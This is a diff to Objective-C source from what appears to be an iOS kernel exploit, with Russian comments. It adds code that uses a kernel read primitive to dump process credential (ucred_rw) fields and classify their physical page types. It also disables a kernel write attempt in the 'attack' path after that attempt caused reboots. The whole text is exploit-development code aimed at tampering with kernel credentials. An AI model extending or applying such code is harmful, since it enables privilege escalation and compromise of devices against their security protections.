@@ -2472,6 +2472,21 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         for (int i = 0; i < 8; i++)
             [rw appendFormat:@" +%x:%#018llx", i * 8, (unsigned long long)early_kread64(myRW + (uint64_t)i * 8)];
         kpNote(r, [NSString stringWithFormat:@"  [RPT] ucred_rw:%@", rw]);
+        // 2.0.56: спутники +0x30/+0x38 — не исследованы
+        {
+            uint64_t w30 = kp_untag_ptr(early_kread64(myRW + 0x30));
+            uint64_t w38 = kp_untag_ptr(early_kread64(myRW + 0x38));
+            int t30 = kpLooksLikeKernelPointer(w30) ? (kvtophys(w30 & ~0x3fffULL) ? kpFrameTypeOf(kvtophys(w30 & ~0x3fffULL)) : -1) : -1;
+            int t38 = kpLooksLikeKernelPointer(w38) ? (kvtophys(w38 & ~0x3fffULL) ? kpFrameTypeOf(kvtophys(w38 & ~0x3fffULL)) : -1) : -1;
+            NSMutableString *d30 = [NSMutableString string];
+            if (kpLooksLikeKernelPointer(w30))
+                for (int i = 0; i < 8; i++) [d30 appendFormat:@" +%x:%#018llx", i*8, (unsigned long long)early_kread64(w30 + i*8)];
+            NSMutableString *d38 = [NSMutableString string];
+            if (kpLooksLikeKernelPointer(w38))
+                for (int i = 0; i < 8; i++) [d38 appendFormat:@" +%x:%#018llx", i*8, (unsigned long long)early_kread64(w38 + i*8)];
+            kpNote(r, [NSString stringWithFormat:@"  [RPT] rw+30=%#llx t=%d:%@", (unsigned long long)w30, t30, d30]);
+            kpNote(r, [NSString stringWithFormat:@"  [RPT] rw+38=%#llx t=%d:%@", (unsigned long long)w38, t38, d38]);
+        }
         // кандидат: ucred_rw+0x10 → возможно posix_cred / cr_label
         uint64_t rw10 = kp_untag_ptr(early_kread64(myRW + 0x10));
         uint64_t rw10pa = kpLooksLikeKernelPointer(rw10) ? kvtophys(rw10 & ~0x3fffULL) : 0;
@@ -2618,9 +2633,10 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             // DMA пропускаем здесь; он живёт в dump-пути. Логируем факт.
             kpNote(r, @"  [FTE] DMA-try: пропущен в атаке (нет svc/tsd в этом скоупе) — идём сразу к kwrite");
         }
-        // B) kwrite-попытка ПОСЛЕДНЕЙ в функции — если фолт, ребут, но весь
-        //    диагностический лог уже напечатан.
-        if (fteUc && fteUc != 0) {
+        // B) kwrite-попытка ВЫРЕЗАНА в 2.0.56 — FTE-страница типа 0x02 дала
+        //    ребут (апертура-фолт). Только дамп.
+        kpNote(r, @"  [FTE] kwrite ВЫРЕЗАН (2.0.56) — тип 0x02 не пишется, был ребут");
+        if (0 && fteUc && fteUc != 0) {
             uint64_t eU = early_kread64(fteUc);
             uint64_t eU2 = early_kread64(fteUc + 8);
             uint32_t typeB = (uint32_t)((eU >> 16) & 0xff);
